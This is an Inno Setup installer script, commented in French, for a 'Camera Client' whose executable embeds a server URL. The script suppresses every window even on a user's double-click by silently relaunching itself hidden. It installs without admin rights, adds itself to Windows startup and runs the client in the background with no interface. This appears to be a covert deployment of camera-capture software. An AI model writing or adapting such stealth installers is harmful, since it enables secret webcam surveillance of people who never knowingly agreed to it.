; Installateur Windows du client caméra — 100 % silencieux, sans saisie.
; Nécessite Inno Setup (gratuit) : https://jrsoftware.org/isinfo.php
; Compilation : ISCC packaging\windows\installer.iss
; (le script build_windows.bat le fait automatiquement s'il trouve ISCC)
;
; Le résultat, CameraClient-Setup.exe, ne nécessite PAS Python sur la
; machine de l'utilisateur : dist\CameraClient.exe (fabriqué par
; PyInstaller) embarque déjà tout l'interpréteur ET l'URL du serveur
; (voir embedded_config.py, généré par build_windows.bat).
;
; Comportement : un simple double-clic sur CameraClient-Setup.exe
;   - n'affiche AUCUNE fenêtre (il se relance lui-même en mode très silencieux) ;
;   - installe le client dans le profil de l'utilisateur (pas d'admin requis) ;
;   - active le démarrage automatique avec Windows ;
;   - lance le client immédiatement, en arrière-plan, sans fenêtre.
; Les options /VERYSILENT, /SUPPRESSMSGBOX, /NORESTART restent acceptées
; (déploiement par script, GPO...), mais ne sont plus nécessaires.
;
; IMPORTANT : ce script vit dans packaging\windows\, PAS dans build\windows\.
; build\ est l'espace de travail de PyInstaller (il est nettoyé/recréé à
; chaque build avec --clean) : tout fichier qui y vivrait serait supprimé.

#define MyAppName "Camera Client"
#define MyAppVersion "1.0.2"
#define MyAppExeName "CameraClient.exe"

[Setup]
; AppId : GUID corrigé (l'ancien avait une accolade fermante en trop et des
; caractères non hexadécimaux — "CAMERACLIENT1" n'est pas un GUID valide).
; NE PLUS CHANGER cette ligne ensuite, sinon les mises à jour futures
; s'installeront côte à côte au lieu de remplacer l'ancienne version.
AppId={{2F2C5B3E-7A1D-4B7A-9B2E-1A2B3C4D5E6F}
AppName={#MyAppName}
AppVersion={#MyAppVersion}
AppPublisher=Selon Randriavao
DefaultDirName={autopf}\{#MyAppName}
DisableProgramGroupPage=yes
DisableWelcomePage=yes
DisableDirPage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
DisableStartupPrompt=yes
PrivilegesRequired=lowest
ArchitecturesInstallIn64BitMode=x64compatible
OutputDir=..\..\releases
OutputBaseFilename=CameraClient-Setup
Compression=lzma
SolidCompression=yes
UninstallDisplayIcon={app}\{#MyAppExeName}
UninstallDisplayName={#MyAppName}
UsePreviousLanguage=no
AllowNoIcons=yes

[Languages]
Name: "english"; MessagesFile: "compiler:Default.isl"

[Files]
Source: "..\..\dist\{#MyAppExeName}"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
; Démarrage automatique avec la session Windows (toujours activé).
Name: "{userstartup}\{#MyAppName}"; Filename: "{app}\{#MyAppExeName}"

[Run]
; Lancement immédiat, en arrière-plan, y compris en mode silencieux
; (pas de « skipifsilent », sinon le client ne démarrerait qu'à la prochaine session).
Filename: "{app}\{#MyAppExeName}"; Flags: nowait runhidden runasoriginaluser

[UninstallRun]
Filename: "{sys}\taskkill.exe"; Parameters: "/F /IM {#MyAppExeName}"; Flags: runhidden; RunOnceId: "StopCameraClient"

[UninstallDelete]
Type: filesandordirs; Name: "{localappdata}\CameraClient"

[Code]
{ ---------------------------------------------------------------------------
  Relance automatique en mode silencieux au double-clic.

  LE BUG DE LA VERSION PRÉCÉDENTE : elle utilisait Exec(..., ewNoWait, ...)
  puis faisait Result := False SANS VÉRIFIER si Exec avait réussi. ewNoWait
  ne fait que démarrer le processus enfant sans l'attendre : le parent
  quittait donc immédiatement, et l'enfant pouvait être interrompu avant
  d'avoir fini de s'installer (antivirus, Windows qui nettoie les processus
  orphelins pendant la fermeture du parent, etc.) → aucune interface, mais
  aussi aucune installation réelle.

  LA CORRECTION : Exec(..., ewWaitUntilTerminated, ...) attend que l'enfant
  ait RÉELLEMENT terminé son installation avant que le parent ne quitte, et
  on vérifie la valeur de retour d'Exec : on ne quitte silencieusement que
  si la relance a réellement réussi. Si elle échoue, on laisse l'installateur
  continuer normalement (interface visible) plutôt que de quitter sans rien
  avoir installé.
  --------------------------------------------------------------------------- }
function InitializeSetup(): Boolean;
var
  ResultCode: Integer;
begin
  Result := True;

  { Mode silencieux déjà demandé (script, GPO, ligne de commande) :
    on ne relance pas, on laisse l'installateur continuer. }
  if WizardSilent then
    Exit;

  { Double-clic : on relance CE MÊME exécutable en mode très silencieux,
    en ATTENDANT réellement la fin de l'installation. }
  if Exec(ExpandConstant('{srcexe}'), '/VERYSILENT /SUPPRESSMSGBOX /NORESTART',
          '', SW_HIDE, ewWaitUntilTerminated, ResultCode) then
  begin
    { L'enfant a terminé son installation : on quitte sans rien afficher. }
    Result := False;
  end;
  { Si Exec a échoué, Result reste True : l'installateur continue
    normalement (interface visible) plutôt que de quitter sans avoir
    rien installé. }
end;

{ Mise à jour : arrête l'ancienne instance du client pour pouvoir remplacer
  le .exe pendant l'installation. }
function PrepareToInstall(var NeedsRestart: Boolean): String;
var
  ResultCode: Integer;
begin
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM {#MyAppExeName}', '',
       SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Result := '';
end;